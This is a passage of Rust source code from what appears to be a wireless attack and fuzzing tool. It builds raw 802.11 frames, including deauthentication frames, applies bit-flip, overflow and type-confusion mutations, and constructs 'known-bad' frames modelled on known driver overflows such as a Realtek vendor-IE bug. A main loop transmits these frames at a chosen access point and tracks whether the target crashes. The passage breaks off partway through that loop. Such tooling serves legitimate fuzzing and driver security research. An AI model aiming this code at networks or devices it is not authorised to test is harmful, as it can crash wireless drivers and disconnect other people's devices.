    buf[pos] = 0x00; pos += 1;
    buf[pos..pos + 6].copy_from_slice(target); pos += 6;
    buf[pos..pos + 6].copy_from_slice(our_mac); pos += 6;
    buf[pos..pos + 6].copy_from_slice(target); pos += 6;
    buf[pos] = (seq & 0xFF) as u8; pos += 1;
    buf[pos] = ((seq >> 8) & 0xFF) as u8; pos += 1;

    // Cap info + Listen interval
    buf[pos] = 0x31; pos += 1;
    buf[pos] = 0x04; pos += 1;
    buf[pos] = 0x0A; pos += 1;
    buf[pos] = 0x00; pos += 1;

    // SSID IE
    let ssid_bytes = ssid.as_bytes();
    let ssid_len = ssid_bytes.len().min(32);
    buf[pos] = 0; pos += 1;
    buf[pos] = ssid_len as u8; pos += 1;
    if ssid_len > 0 {
        buf[pos..pos + ssid_len].copy_from_slice(&ssid_bytes[..ssid_len]);
        pos += ssid_len;
    }

    // Supported Rates
    buf[pos] = 1; pos += 1;
    buf[pos] = 8; pos += 1;
    let rates = [0x02, 0x04, 0x0B, 0x16, 0x0C, 0x12, 0x18, 0x24];
    buf[pos..pos + 8].copy_from_slice(&rates); pos += 8;

    pos
}

/// Build a seed association response frame.
fn build_seed_assoc_resp(
    buf: &mut [u8],
    target: &[u8; 6],
    bssid: &[u8; 6],
    seq: u16,
) -> usize {
    if buf.len() < 34 { return 0; }
    let mut pos = 0;

    buf[pos] = fc::ASSOC_RESP; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos..pos + 6].copy_from_slice(target); pos += 6;
    buf[pos..pos + 6].copy_from_slice(bssid); pos += 6;
    buf[pos..pos + 6].copy_from_slice(bssid); pos += 6;
    buf[pos] = (seq & 0xFF) as u8; pos += 1;
    buf[pos] = ((seq >> 8) & 0xFF) as u8; pos += 1;

    // Cap info + Status + AID
    buf[pos] = 0x31; pos += 1;
    buf[pos] = 0x04; pos += 1;
    buf[pos] = 0x00; pos += 1; // status: success
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x01; pos += 1; // AID = 1
    buf[pos] = 0xC0; pos += 1;

    // Supported Rates
    buf[pos] = 1; pos += 1;
    buf[pos] = 8; pos += 1;
    let rates = [0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24];
    buf[pos..pos + 8].copy_from_slice(&rates); pos += 8;

    pos
}

/// Build a seed deauthentication frame.
fn build_seed_deauth(
    buf: &mut [u8],
    target: &[u8; 6],
    our_mac: &[u8; 6],
    seq: u16,
) -> usize {
    if buf.len() < 26 { return 0; }
    let mut pos = 0;

    buf[pos] = fc::DEAUTH; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos..pos + 6].copy_from_slice(target); pos += 6;
    buf[pos..pos + 6].copy_from_slice(our_mac); pos += 6;
    buf[pos..pos + 6].copy_from_slice(target); pos += 6;
    buf[pos] = (seq & 0xFF) as u8; pos += 1;
    buf[pos] = ((seq >> 8) & 0xFF) as u8; pos += 1;
    buf[pos] = 0x07; pos += 1; // reason: class 3
    buf[pos] = 0x00; pos += 1;

    pos
}

/// Build a seed disassociation frame.
fn build_seed_disassoc(
    buf: &mut [u8],
    target: &[u8; 6],
    our_mac: &[u8; 6],
    seq: u16,
) -> usize {
    if buf.len() < 26 { return 0; }
    let mut pos = 0;

    buf[pos] = fc::DISASSOC; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos..pos + 6].copy_from_slice(target); pos += 6;
    buf[pos..pos + 6].copy_from_slice(our_mac); pos += 6;
    buf[pos..pos + 6].copy_from_slice(target); pos += 6;
    buf[pos] = (seq & 0xFF) as u8; pos += 1;
    buf[pos] = ((seq >> 8) & 0xFF) as u8; pos += 1;
    buf[pos] = 0x08; pos += 1; // reason
    buf[pos] = 0x00; pos += 1;

    pos
}

/// Build a seed action frame (SA Query Request).
fn build_seed_action(
    buf: &mut [u8],
    target: &[u8; 6],
    our_mac: &[u8; 6],
    seq: u16,
) -> usize {
    if buf.len() < 28 { return 0; }
    let mut pos = 0;

    buf[pos] = fc::ACTION; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos..pos + 6].copy_from_slice(target); pos += 6;
    buf[pos..pos + 6].copy_from_slice(our_mac); pos += 6;
    buf[pos..pos + 6].copy_from_slice(target); pos += 6;
    buf[pos] = (seq & 0xFF) as u8; pos += 1;
    buf[pos] = ((seq >> 8) & 0xFF) as u8; pos += 1;

    // SA Query Request (Category 8, Action 0)
    buf[pos] = 8; pos += 1;   // category: SA Query
    buf[pos] = 0; pos += 1;   // action: request
    buf[pos] = 0x42; pos += 1; // transaction ID
    buf[pos] = 0x42; pos += 1;

    pos
}

/// Build a seed EAP/EAPOL frame (QoS Data with LLC/SNAP + EAP-Identity).
fn build_seed_eap(
    buf: &mut [u8],
    target: &[u8; 6],
    our_mac: &[u8; 6],
    bssid: &[u8; 6],
    seq: u16,
) -> usize {
    if buf.len() < 50 { return 0; }
    let mut pos = 0;

    // QoS Data frame
    buf[pos] = fc::QOS_DATA; pos += 1;
    buf[pos] = 0x01; pos += 1; // To DS
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x00; pos += 1;
    // Addr1 = BSSID (RA)
    buf[pos..pos + 6].copy_from_slice(bssid); pos += 6;
    // Addr2 = SA
    buf[pos..pos + 6].copy_from_slice(our_mac); pos += 6;
    // Addr3 = DA
    buf[pos..pos + 6].copy_from_slice(target); pos += 6;
    // Seq
    buf[pos] = (seq & 0xFF) as u8; pos += 1;
    buf[pos] = ((seq >> 8) & 0xFF) as u8; pos += 1;
    // QoS control
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x00; pos += 1;

    // LLC/SNAP header for EAPOL
    buf[pos] = 0xAA; pos += 1;
    buf[pos] = 0xAA; pos += 1;
    buf[pos] = 0x03; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x88; pos += 1; // EtherType: 802.1X
    buf[pos] = 0x8E; pos += 1;

    // EAPOL: version 2, type EAP-Packet (0), length 5
    buf[pos] = 0x02; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x05; pos += 1;

    // EAP: code=Request(1), id=1, length=5, type=Identity(1)
    buf[pos] = 0x01; pos += 1;
    buf[pos] = 0x01; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x05; pos += 1;
    buf[pos] = 0x01; pos += 1;

    pos
}

/// Build the appropriate seed frame based on frame type.
fn build_seed_frame(
    buf: &mut [u8],
    frame_type: FuzzFrameType,
    target: &[u8; 6],
    our_mac: &[u8; 6],
    bssid: &[u8; 6],
    ssid: &str,
    seq: u16,
) -> usize {
    match frame_type {
        FuzzFrameType::Beacon => build_seed_beacon(buf, bssid, our_mac, ssid, seq),
        FuzzFrameType::ProbeReq => build_seed_probe_req(buf, our_mac, ssid, seq),
        FuzzFrameType::ProbeResp => build_seed_probe_resp(buf, target, bssid, ssid, seq),
        FuzzFrameType::Auth => build_seed_auth(buf, target, our_mac, seq),
        FuzzFrameType::AssocReq => build_seed_assoc_req(buf, target, our_mac, ssid, seq),
        FuzzFrameType::AssocResp => build_seed_assoc_resp(buf, target, bssid, seq),
        FuzzFrameType::Deauth => build_seed_deauth(buf, target, our_mac, seq),
        FuzzFrameType::Disassoc => build_seed_disassoc(buf, target, our_mac, seq),
        FuzzFrameType::Action => build_seed_action(buf, target, our_mac, seq),
        FuzzFrameType::Eap => build_seed_eap(buf, target, our_mac, bssid, seq),
        FuzzFrameType::All => {
            // Should never be called with All — caller must resolve first
            build_seed_beacon(buf, bssid, our_mac, ssid, seq)
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Mutation engines
// ═══════════════════════════════════════════════════════════════════════════════

/// Flip random bits in the frame.
fn mutate_bit_flip(frame: &mut [u8], len: usize, count: u32, rng: &mut Xoshiro256) {
    for _ in 0..count {
        if len == 0 { break; }
        let byte_pos = rng.range(len as u32) as usize;
        let bit_pos = rng.range(8);
        frame[byte_pos] ^= 1 << bit_pos;
    }
}

/// Replace random bytes with random values.
fn mutate_byte_flip(frame: &mut [u8], len: usize, count: u32, rng: &mut Xoshiro256) {
    for _ in 0..count {
        if len == 0 { break; }
        let pos = rng.range(len as u32) as usize;
        frame[pos] = rng.range(256) as u8;
    }
}

/// Boundary values for 8-bit fields.
const BOUNDARY_VALS_8: [u8; 8] = [0x00, 0xFF, 0x7F, 0x80, 0x01, 0xFE, 0x7E, 0x81];

/// Boundary values for 16-bit fields.
const BOUNDARY_VALS_16: [u16; 6] = [0x0000, 0xFFFF, 0x7FFF, 0x8000, 0x0001, 0xFFFE];

/// Set fields to boundary values.
fn mutate_boundary(frame: &mut [u8], len: usize, rng: &mut Xoshiro256) {
    if len < 4 { return; }

    // 8-bit boundary
    let pos = rng.range((len - 1) as u32) as usize;
    let val_idx = rng.range(BOUNDARY_VALS_8.len() as u32) as usize;
    frame[pos] = BOUNDARY_VALS_8[val_idx];

    // 16-bit boundary at random position
    if len >= 4 {
        let pos = rng.range((len - 2) as u32) as usize;
        let idx = rng.range(BOUNDARY_VALS_16.len() as u32) as usize;
        let val = BOUNDARY_VALS_16[idx];
        frame[pos] = (val & 0xFF) as u8;
        frame[pos + 1] = (val >> 8) as u8;
    }
}

/// Extend frame with extra random bytes past limits (overflow).
/// Returns the new length.
fn mutate_overflow(
    frame: &mut [u8],
    len: usize,
    max_len: usize,
    extra_bytes: u32,
    rng: &mut Xoshiro256,
) -> usize {
    let mut new_len = len + extra_bytes as usize;
    if new_len > max_len { new_len = max_len; }
    for i in len..new_len {
        frame[i] = rng.range(256) as u8;
    }
    new_len
}

/// Truncate frame to shorter-than-minimum length.
/// Returns the new length.
fn mutate_truncation(len: usize, rng: &mut Xoshiro256) -> usize {
    if len <= 4 { return len; }
    2 + rng.range((len - 2) as u32) as usize
}

/// FC byte values for type confusion — includes mgmt, data, ctrl, and unusual types.
const FC_CONFUSE_VALUES: [u8; 21] = [
    0x00, 0x10, 0x40, 0x50, 0x80, 0xA0, 0xB0, 0xC0, 0xD0, // mgmt
    0x08, 0x88, 0x48, 0xC8,                                   // data
    0xB4, 0xC4, 0xD4, 0xA4,                                   // ctrl
    0xF0, 0xE0, 0x30, 0x20,                                   // unusual
];

/// Swap frame type/subtype with unexpected values.
fn mutate_type_confuse(frame: &mut [u8], len: usize, rng: &mut Xoshiro256) {
    if len < 2 { return; }
    let idx = rng.range(FC_CONFUSE_VALUES.len() as u32) as usize;
    frame[0] = FC_CONFUSE_VALUES[idx];
}

/// Fill with fully random bytes, preserving 802.11 header addresses.
fn mutate_random(frame: &mut [u8], len: usize, rng: &mut Xoshiro256) {
    // Keep MAC header intact (24 bytes), randomize payload
    let start = if len > 24 { 24 } else { 2 };
    for i in start..len {
        frame[i] = rng.range(256) as u8;
    }
}

/// Duplicate IEs within the frame. Returns the new length.
fn mutate_repeat_ie(
    frame: &mut [u8],
    len: usize,
    max_len: usize,
    repeat_count: u32,
    rng: &mut Xoshiro256,
) -> usize {
    // Determine IE start based on frame type
    let fc_byte = frame[0];
    let ie_start = if fc_byte == fc::BEACON || fc_byte == fc::PROBE_RESP {
        36 // 24 header + 12 fixed
    } else if fc_byte == fc::ASSOC_REQ {
        28 // 24 header + 4 fixed
    } else {
        24
    };

    if ie_start >= len { return len; }

    // Parse IEs to find candidates
    let mut ie_positions = Vec::new();
    let mut ie_lengths = Vec::new();
    let mut pos = ie_start;
    while pos + 2 <= len && ie_positions.len() < 64 {
        let tag_len = frame[pos + 1] as usize;
        if pos + 2 + tag_len > len { break; }
        ie_positions.push(pos);
        ie_lengths.push(2 + tag_len);
        pos += 2 + tag_len;
    }

    if ie_positions.is_empty() { return len; }

    // Pick a random IE and repeat it
    let pick = rng.range(ie_positions.len() as u32) as usize;
    let ie_size = ie_lengths[pick];
    let ie_pos = ie_positions[pick];
    let mut new_len = len;

    // Copy the IE data before we start appending
    let ie_data: Vec<u8> = frame[ie_pos..ie_pos + ie_size].to_vec();

    for _ in 0..repeat_count {
        if new_len + ie_size > max_len { break; }
        frame[new_len..new_len + ie_size].copy_from_slice(&ie_data);
        new_len += ie_size;
    }

    new_len
}

// ═══════════════════════════════════════════════════════════════════════════════
//  IE-specific mutations (domain = IE)
// ═══════════════════════════════════════════════════════════════════════════════

/// Build a frame with an oversized IE that overflows past its declared length.
/// Returns the frame length.
fn mutate_ie_overflow(
    buf: &mut [u8],
    max_len: usize,
    target_ie_id: u8,
    overflow_bytes: u32,
    rng: &mut Xoshiro256,
) -> usize {
    let mut pos = 0;

    // Minimal beacon header
    buf[pos] = fc::BEACON; pos += 1;
    buf[pos] = 0x00; pos += 1;
    // duration + addrs + seq (22 bytes)
    buf[pos..pos + 22].fill(0); pos += 22;
    // fixed params (12 bytes)
    buf[pos..pos + 12].fill(0); pos += 12;

    // Normal SSID IE
    buf[pos] = 0; pos += 1;
    buf[pos] = 4; pos += 1;
    buf[pos] = b'F'; pos += 1;
    buf[pos] = b'U'; pos += 1;
    buf[pos] = b'Z'; pos += 1;
    buf[pos] = b'Z'; pos += 1;

    // Oversized target IE
    let ie_id = if target_ie_id == 0xFF {
        rng.range(256) as u8
    } else {
        target_ie_id
    };

    let mut ie_len: i32 = 255; // maximum standard IE length
    if (pos as i32) + 2 + ie_len + (overflow_bytes as i32) > max_len as i32 {
        ie_len = max_len as i32 - pos as i32 - 2 - overflow_bytes as i32;
    }
    if ie_len < 0 { ie_len = 0; }

    buf[pos] = ie_id; pos += 1;
    buf[pos] = ie_len as u8; pos += 1; // claimed length

    // Fill with random data BEYOND the claimed length
    let mut actual_fill = ie_len as usize + overflow_bytes as usize;
    if pos + actual_fill > max_len {
        actual_fill = max_len - pos;
    }
    for i in 0..actual_fill {
        buf[pos + i] = rng.range(256) as u8;
    }
    pos += actual_fill;

    pos
}

/// Insert a malformed IE with claimed length much larger than actual data.
/// Returns the new frame length.
fn mutate_ie_malformed(
    frame: &mut [u8],
    len: usize,
    max_len: usize,
    rng: &mut Xoshiro256,
) -> usize {
    let ie_start = 36; // after beacon fixed params
    if ie_start >= max_len - 4 { return len; }

    let mut pos = if len > ie_start { len } else { ie_start };
    if pos + 4 > max_len { return len; }

    // Malformed IE: claimed length much larger than actual
    let ie_id = rng.range(256) as u8;
    frame[pos] = ie_id; pos += 1;
    frame[pos] = 200; pos += 1; // claims 200 bytes

    // But only write a few
    let mut actual = 4 + rng.range(8) as usize;
    if pos + actual > max_len {
        actual = max_len - pos;
    }
    for i in 0..actual {
        frame[pos + i] = rng.range(256) as u8;
    }
    pos += actual;

    pos
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Known-bad patterns (CVE-triggering frame constructions)
// ═══════════════════════════════════════════════════════════════════════════════

/// Build a known-bad CVE-triggering frame. Selects one of 6 patterns at random.
/// Returns the frame length.
fn build_known_bad(
    buf: &mut [u8],
    max_len: usize,
    target: &[u8; 6],
    our_mac: &[u8; 6],
    seq: u16,
    rng: &mut Xoshiro256,
) -> usize {
    let pattern = rng.range(6);

    match pattern {
        0 => {
            // CVE-2019-17666-like: oversized vendor IE in beacon (Realtek overflow)
            let mut pos = build_seed_beacon(buf, our_mac, our_mac, "FUZZ", seq);
            if pos == 0 || pos + 260 > max_len { return if pos > 0 { pos } else { 0 }; }
            buf[pos] = 221; pos += 1; // Vendor Specific
            buf[pos] = 255; pos += 1; // max length
            // Vendor OUI (Realtek)
            buf[pos] = 0x00; pos += 1;
            buf[pos] = 0xE0; pos += 1;
            buf[pos] = 0x4C; pos += 1;
            // Fill with 'A' pattern
            for _ in 0..252 {
                if pos >= max_len { break; }
                buf[pos] = 0x41; pos += 1;
            }
            pos
        }
        1 => {
            // Zero-length SSID IE followed by oversized SSID IE
            let mut pos = 0;
            buf[pos] = fc::BEACON; pos += 1;
            buf[pos] = 0x00; pos += 1;
            buf[pos..pos + 6].copy_from_slice(&[0xFF; 6]); pos += 6;
            buf[pos..pos + 6].copy_from_slice(our_mac); pos += 6;
            buf[pos..pos + 6].copy_from_slice(our_mac); pos += 6;
            buf[pos] = (seq & 0xFF) as u8; pos += 1;
            buf[pos] = ((seq >> 8) & 0xFF) as u8; pos += 1;
            buf[pos..pos + 12].fill(0); pos += 12;

            // Zero SSID
            buf[pos] = 0; pos += 1;
            buf[pos] = 0; pos += 1;
            // Then another SSID with length 255
            buf[pos] = 0; pos += 1;
            buf[pos] = 255; pos += 1;
            let mut fill = 255usize;
            if pos + fill > max_len { fill = max_len - pos; }
            for i in 0..fill {
                buf[pos + i] = b'B';
            }
            pos += fill;
            pos
        }
        2 => {
            // Deeply nested vendor-specific IEs (parser recursion attack)
            let mut pos = build_seed_beacon(buf, our_mac, our_mac, "DEEP", seq);
            for _ in 0..32 {
                if pos + 10 >= max_len { break; }
                buf[pos] = 221; pos += 1; // Vendor Specific
                let mut remaining = max_len - pos - 1;
                if remaining > 255 { remaining = 255; }
                if remaining < 4 { break; }
                buf[pos] = remaining as u8; pos += 1;
                buf[pos] = 0x00; pos += 1; // MS OUI
                buf[pos] = 0x50; pos += 1;
                buf[pos] = 0xF2; pos += 1;
            }
            // Fill remaining with random
            while pos < max_len {
                buf[pos] = rng.range(256) as u8;
                pos += 1;
            }
            pos
        }
        3 => {
            // Malformed RSN IE (common crash vector)
            let mut pos = build_seed_beacon(buf, our_mac, our_mac, "RSN", seq);
            if pos + 40 > max_len { return pos; }
            buf[pos] = 48; pos += 1; // RSN IE
            buf[pos] = 36; pos += 1; // length
            // Version
            buf[pos] = 0x01; pos += 1;
            buf[pos] = 0x00; pos += 1;
            // Group cipher: fill with garbage
            for _ in 0..34 {
                if pos >= max_len { break; }
                buf[pos] = rng.range(256) as u8;
                pos += 1;
            }
            pos
        }
        4 => {
            // Auth frame with huge challenge text IE
            let mut pos = 0;
            buf[pos] = fc::AUTH; pos += 1;
            buf[pos] = 0x00; pos += 1;
            buf[pos] = 0x00; pos += 1;
            buf[pos] = 0x00; pos += 1;
            buf[pos..pos + 6].copy_from_slice(target); pos += 6;
            buf[pos..pos + 6].copy_from_slice(our_mac); pos += 6;
            buf[pos..pos + 6].copy_from_slice(target); pos += 6;
            buf[pos] = (seq & 0xFF) as u8; pos += 1;
            buf[pos] = ((seq >> 8) & 0xFF) as u8; pos += 1;
            // Auth: Shared Key, seq 2 (expects challenge)
            buf[pos] = 0x01; pos += 1; // algo: Shared Key
            buf[pos] = 0x00; pos += 1;
            buf[pos] = 0x02; pos += 1; // seq 2
            buf[pos] = 0x00; pos += 1;
            buf[pos] = 0x00; pos += 1; // status
            buf[pos] = 0x00; pos += 1;
            // Challenge text IE (tag 16) with max length
            buf[pos] = 16; pos += 1;
            buf[pos] = 255; pos += 1;
            let mut fill = 255usize;
            if pos + fill > max_len { fill = max_len - pos; }
            for i in 0..fill {
                buf[pos + i] = rng.range(256) as u8;
            }
            pos += fill;
            pos
        }
        5 => {
            // Association request with corrupted HT Capabilities IE
            let mut pos = build_seed_assoc_req(buf, target, our_mac, "FUZZ", seq);
            if pos + 20 > max_len { return pos; }
            buf[pos] = 45; pos += 1; // HT Capabilities
            buf[pos] = 26; pos += 1; // standard length
            for _ in 0..26 {
                if pos >= max_len { break; }
                buf[pos] = rng.range(256) as u8;
                pos += 1;
            }
            pos
        }
        _ => {
            build_seed_beacon(buf, our_mac, our_mac, "FUZZ", seq)
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Mutation selection and application
// ═══════════════════════════════════════════════════════════════════════════════

/// Apply the selected mutation to a frame. Returns the new frame length.
fn apply_mutation(
    frame: &mut [u8],
    len: usize,
    max_len: usize,
    mutation_bit: u32,
    params: &FuzzParams,
    rng: &mut Xoshiro256,
) -> usize {
    match mutation_bit {
        mutation::BIT_FLIP => {
            mutate_bit_flip(frame, len, params.bit_flip_count, rng);
            len
        }
        mutation::BYTE_FLIP => {
            mutate_byte_flip(frame, len, params.byte_flip_count, rng);
            len
        }
        mutation::BOUNDARY => {
            mutate_boundary(frame, len, rng);
            len
        }
        mutation::OVERFLOW => {
            mutate_overflow(frame, len, max_len, params.overflow_extra_bytes, rng)
        }
        mutation::TRUNCATION => {
            mutate_truncation(len, rng)
        }
        mutation::TYPE_CONFUSE => {
            mutate_type_confuse(frame, len, rng);
            len
        }
        mutation::RANDOM => {
            mutate_random(frame, len, rng);
            len
        }
        mutation::REPEAT => {
            mutate_repeat_ie(frame, len, max_len, params.ie_repeat_count, rng)
        }
        mutation::KNOWN_BAD => {
            // Known-bad replaces the entire frame — extract SA from current frame
            let our_mac = if len >= 16 {
                let mut mac = [0u8; 6];
                mac.copy_from_slice(&frame[10..16]);
                mac
            } else {
                [0u8; 6]
            };
            let target = if len >= 10 {
                let mut mac = [0u8; 6];
                mac.copy_from_slice(&frame[4..10]);
                mac
            } else {
                [0u8; 6]
            };
            build_known_bad(frame, max_len, &target, &our_mac, 0, rng)
        }
        _ => len,
    }
}

/// Pick a random enabled mutation strategy (returns single bit).
fn pick_mutation(enabled: u32, rng: &mut Xoshiro256) -> u32 {
    let mut bits = [0u32; 16];
    let mut n = 0u32;
    for i in 0..16 {
        if enabled & (1 << i) != 0 {
            bits[n as usize] = 1 << i;
            n += 1;
        }
    }
    if n == 0 { return mutation::BIT_FLIP; }
    bits[rng.range(n) as usize]
}

/// Pick a frame type for the current iteration.
/// If configured to All, cycles through all 10 concrete types.
fn pick_frame_type(configured: FuzzFrameType, iteration: u64) -> FuzzFrameType {
    if configured != FuzzFrameType::All { return configured; }
    let cycle = FuzzFrameType::all_concrete();
    cycle[(iteration % cycle.len() as u64) as usize]
}

/// Pick a domain for the current iteration.
/// If configured to All, cycles through all 3 concrete domains.
fn pick_domain(configured: FuzzDomain, iteration: u64) -> FuzzDomain {
    if configured != FuzzDomain::All { return configured; }
    let cycle = FuzzDomain::all_concrete();
    cycle[(iteration % cycle.len() as u64) as usize]
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Health check — probe target to detect crashes
// ═══════════════════════════════════════════════════════════════════════════════

/// Send a probe request and wait for response/beacon from target.
/// Returns true if target is alive.
fn health_check_probe(
    shared: &SharedAdapter,
    reader: &crate::pipeline::PipelineSubscriber,
    target_bssid: &[u8; 6],
    ssid: &str,
    probe_timeout: Duration,
    probes_sent: &mut u32,
    probes_answered: &mut u32,
    running: &Arc<AtomicBool>,
    _rng: &mut Xoshiro256,
) -> bool {
    // Build probe request
    let mut probe_buf = [0u8; 128];
    let our_mac_addr = shared.mac();
    let our_mac = our_mac_addr.0;
    let plen = build_seed_probe_req(
        &mut probe_buf,
        &our_mac,
        ssid,
        (*probes_sent & 0xFFF0) as u16,
    );

    if plen > 0 {
        let tx_opts = TxOptions {
            retries: 3,
            ..Default::default()
        };
        let _ = shared.tx_frame(&probe_buf[..plen], &tx_opts);
        *probes_sent += 1;
    }

    // Wait for probe response or beacon from target
    let deadline = Instant::now() + probe_timeout;
    while Instant::now() < deadline && running.load(Ordering::SeqCst) {
        let rx_timeout = Duration::from_millis(100);
        match reader.recv_timeout(rx_timeout) {
            Some(frame) => {
                if frame.raw.len() < 24 { continue; }
                let fc_byte = frame.raw[0];
                if fc_byte == fc::PROBE_RESP || fc_byte == fc::BEACON {
                    // Check SA (offset 10) matches target
                    if frame.raw.len() >= 16 && frame.raw[10..16] == *target_bssid {
                        *probes_answered += 1;
                        return true;
                    }
                }
            }
            None => continue,
        }
    }

    false
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Event helper
// ═══════════════════════════════════════════════════════════════════════════════

fn push_event(events: &Arc<EventRing<FuzzEvent>>, start: Instant, kind: FuzzEventKind) {
    let seq = events.seq() + 1;
    events.push(FuzzEvent {
        seq,
        timestamp: start.elapsed(),
        kind,
    });
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Main fuzz attack — runs on its own thread via start()
// ═══════════════════════════════════════════════════════════════════════════════

fn run_fuzz_attack(
    shared: &SharedAdapter,
    reader: &crate::pipeline::PipelineSubscriber,
    target: &Ap,
    params: &FuzzParams,
    info: &Arc<Mutex<FuzzInfo>>,
    events: &Arc<EventRing<FuzzEvent>>,
    running: &Arc<AtomicBool>,
    paused: &Arc<AtomicBool>,
    crashes: &Arc<Mutex<Vec<FuzzCrash>>>,
) {
    let start = Instant::now();
    let our_mac_addr = shared.mac();
    let our_mac = our_mac_addr.0;
    let target_mac = target.bssid.0;
    let ssid = if target.ssid.is_empty() { "FUZZ" } else { &target.ssid };

    // Determine actual seed
    let actual_seed = if params.seed == 0 {
        (start.elapsed().as_nanos() as u32) ^ 0xDEAD_BEEF
    } else {
        params.seed
    };

    let mut rng = Xoshiro256::new(actual_seed);

    // Update info with seed
    {
        let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
        info.actual_seed = actual_seed;
    }

    // Fire attack started event
    push_event(events, start, FuzzEventKind::AttackStarted {
        bssid: target.bssid,
        ssid: ssid.to_string(),
        channel: target.channel,
        seed: actual_seed,
        domain: params.domain,
        frame_type: params.frame_type,
        mutations: params.mutations,
    });

    // Lock channel to target's channel
    if let Err(e) = shared.lock_channel(target.channel, "fuzz") {
        push_event(events, start, FuzzEventKind::Error {
            message: format!("Failed to lock channel {}: {}", target.channel, e),
        });
        push_event(events, start, FuzzEventKind::AttackComplete {
            iterations: 0,
            frames_sent: 0,
            frames_received: 0,
            crashes_found: 0,
            crashes_recovered: 0,
            crashes_permanent: 0,
            elapsed: start.elapsed(),
        });
        return;
    }
    push_event(events, start, FuzzEventKind::ChannelLocked { channel: target.channel });

    // Channel settle — wait for PLL lock + AGC
    thread::sleep(params.channel_settle);

    // ── Phase 1: Establish baseline ──
    {
        let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
        info.phase = FuzzPhase::Probing;
    }

    let mut probes_sent: u32 = 0;
    let mut probes_answered: u32 = 0;
    let mut baseline_ok: u32 = 0;

    for i in 0..3 {
        if !running.load(Ordering::SeqCst) { break; }
        let alive = health_check_probe(
            shared, reader, &target_mac, ssid, params.probe_timeout,
            &mut probes_sent, &mut probes_answered, running, &mut rng,
        );
        if alive { baseline_ok += 1; }
        push_event(events, start, FuzzEventKind::BaselineProbe {
            probe_num: i + 1,
            alive,
        });
        if i < 2 { thread::sleep(Duration::from_millis(200)); }
    }

    push_event(events, start, FuzzEventKind::BaselineComplete {
        probes_ok: baseline_ok,
        total: 3,
    });

    if baseline_ok == 0 {
        push_event(events, start, FuzzEventKind::Error {
            message: "Target not responding to probes, aborting".into(),
        });
        shared.unlock_channel();
        push_event(events, start, FuzzEventKind::ChannelUnlocked);
        push_event(events, start, FuzzEventKind::AttackComplete {
            iterations: 0,
            frames_sent: 0,
            frames_received: 0,
            crashes_found: 0,
            crashes_recovered: 0,
            crashes_permanent: 0,
            elapsed: start.elapsed(),
        });
        return;
    }

    // ── Phase 2: Fuzz loop ──
    {
        let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
        info.phase = FuzzPhase::Fuzzing;
    }
    push_event(events, start, FuzzEventKind::FuzzingStarted);

    // TX options: no ACK, no retry — fire and forget
    let tx_opts = TxOptions {
        retries: 0,
        flags: TxFlags::NO_ACK | TxFlags::NO_RETRY,
        ..Default::default()
    };

    // Rate tracking
    let mut rate_start = Instant::now();
    let mut rate_checkpoint: u64 = 0;
    let mut frames_sent: u64 = 0;
    let mut iteration: u64 = 0;
    let mut seq_num: u16 = 0;
    let mut batch_count: u32 = 0;
    let mut last_health_check = Instant::now();

    let mut crash_count: u32 = 0;
    let mut crashes_recovered: u32 = 0;
    let mut crashes_permanent: u32 = 0;

    // Frame buffer (2048 bytes, same as C)
    let mut frame_buf = [0u8; 2048];

    while running.load(Ordering::SeqCst) {
        // Check iteration limit
        if params.max_iterations > 0 && iteration >= params.max_iterations {
            break;
        }

        // Handle pause
        if paused.load(Ordering::SeqCst) {
            // Spin-wait on pause — check every 50ms
            while paused.load(Ordering::SeqCst) && running.load(Ordering::SeqCst) {
                thread::sleep(Duration::from_millis(50));
            }
            if !running.load(Ordering::SeqCst) { break; }
            push_event(events, start, FuzzEventKind::Resumed);
            {
                let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                info.phase = FuzzPhase::Fuzzing;
            }
        }

        // Pick frame type and domain
        let ft = pick_frame_type(params.frame_type, iteration);
        let dom = pick_domain(params.domain, iteration);
        let mut_bit = pick_mutation(params.mutations, &mut rng);

        // Build and mutate frame
        let flen;

        let buf_len = frame_buf.len();

        if dom == FuzzDomain::Ie && mut_bit == mutation::OVERFLOW {
            // Special: IE overflow builds its own frame
            flen = mutate_ie_overflow(
                &mut frame_buf, buf_len,
                params.ie_target_id, params.overflow_extra_bytes, &mut rng,
            );
            // Copy target address into frame header
            if flen >= 22 {
                frame_buf[4..10].copy_from_slice(&[0xFF; 6]); // DA: broadcast
                frame_buf[10..16].copy_from_slice(&our_mac);   // SA
                frame_buf[16..22].copy_from_slice(&target_mac); // BSSID
            }
        } else if mut_bit == mutation::KNOWN_BAD {
            // Known-bad builds its own frame entirely
            flen = build_known_bad(
                &mut frame_buf, buf_len,
                &target_mac, &our_mac, seq_num, &mut rng,
            );
        } else {
            // Normal path: build seed then mutate
            let seed_len = build_seed_frame(
                &mut frame_buf, ft, &target_mac, &our_mac, &target_mac, ssid, seq_num,
            );
            if seed_len == 0 {
                iteration += 1;
                seq_num = seq_num.wrapping_add(1);
                continue;
            }

            if dom == FuzzDomain::Ie {
                // IE domain: mutate only the IE portion, or add malformed IEs
